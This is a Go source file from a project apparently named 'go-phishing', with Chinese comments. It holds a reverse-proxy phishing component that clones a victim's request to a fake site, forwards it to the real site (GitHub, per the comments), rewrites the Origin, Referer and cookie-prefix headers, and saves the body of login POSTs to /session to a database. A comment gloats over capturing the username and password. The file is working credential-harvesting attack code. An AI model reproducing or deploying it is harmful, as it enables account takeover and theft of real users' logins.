package request

import (
	"bytes"
	"go-phishing/db"
	"io/ioutil"
	"net/http"
	"strings"
)

// 將打到 phishing 網站的 request， 複製成要打到真正網站的 request
func CloneRequest(r *http.Request, upstreamURL string, phishURL string) *http.Request {
	// 取得原請求的 method、body
	method := r.Method

	// 把 body 讀出來轉成 string
	bodyByte, _ := ioutil.ReadAll(r.Body)
	bodyStr := string(bodyByte)

	// 如果是 POST 到 /session 的請求
	// 就把 body 存進資料庫內（帳號密碼 GET !!）
	if r.URL.String() == "/session" && r.Method == "POST" {
		db.Insert(bodyStr)
	}
	body := bytes.NewReader(bodyByte)

	// 取得原請求的 url，把它的域名替換成真正的 Github
	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := upstreamURL + path + "?" + rawQuery

	// 建立新的 http.Request
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}

	// 複製整個 request header
	req.Header = r.Header

	// 取代 header 中的 Origin, Referer 網址
	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", referer)
	// 直接把 Accept-Encoding 刪掉
	req.Header.Del("Accept-Encoding")

	for i, value := range req.Header["Cookie"] {
		// 取代 cookie 名字
		newValue := strings.Replace(value, "XXHost", "__Host", -1)
		newValue = strings.Replace(newValue, "XXSecure", "__Secure", -1)
		req.Header["Cookie"][i] = newValue
	}

	return req
}
